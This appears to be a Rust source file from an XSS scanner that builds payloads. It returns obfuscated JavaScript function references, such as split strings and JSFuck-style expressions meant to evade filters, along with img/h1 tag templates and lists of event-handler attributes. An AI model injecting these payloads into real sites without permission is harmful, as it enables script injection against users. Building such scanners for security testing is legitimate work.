pub fn get_jsvalue() -> Vec<String> {
        vec![
                "1".to_string(),
                "(+{}+[])[+!![]]".to_string(),
                "/XSS/.source".to_string(),
            ]
}

pub fn get_jscmd() -> Vec<String> {
        vec![
            "parent['con'+'firm']".to_string(),
            "parent['prom'+'pt']".to_string(),
            "parent['ale'+'rt']".to_string(),
            "globalThis[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]".to_string(),
            "alert".to_string(),
            "prompt".to_string(),
            "confirm".to_string(),
            "this[/*foo*/'alert'/*bar*/]".to_string(),
            "this[/*foo*/'print'/*bar*/]".to_string(),
            "window[/*foo*/'confirm'/*bar*/]".to_string(),
            "self[/*foo*/'prompt'/*bar*/]".to_string(),
            "window['ale'+'rt']".to_string(),
            ]
}

pub fn get_htmltags() -> Vec<String> {
        vec![
                "<img src=x onerror=$JS_FUNC$`$JS_CMD$`>".to_string(),
                "<h1 $JS_FUNC$`$JS_CMD$`>".to_string(),
                "<h1 $JS_FUNC$($JS_CMD)".to_string(),
            ]
}

pub fn get_attr() -> Vec<String> {
        vec![
                "onmouseover".to_string(),
                "onmouseenter".to_string(),
                "onmouseleave".to_string(),
                "onmouseout".to_string(),
                "onclick".to_string(),
                "onmousedown".to_string(),
                "onmouseup".to_string(),
                "ontouchstart".to_string(),
                "ontouchend".to_string(),
                "ontouchmove".to_string(),
                "onpointerenter".to_string(),
                "onpointerleave".to_string(),
                "onpointerover".to_string(),
            ]
}
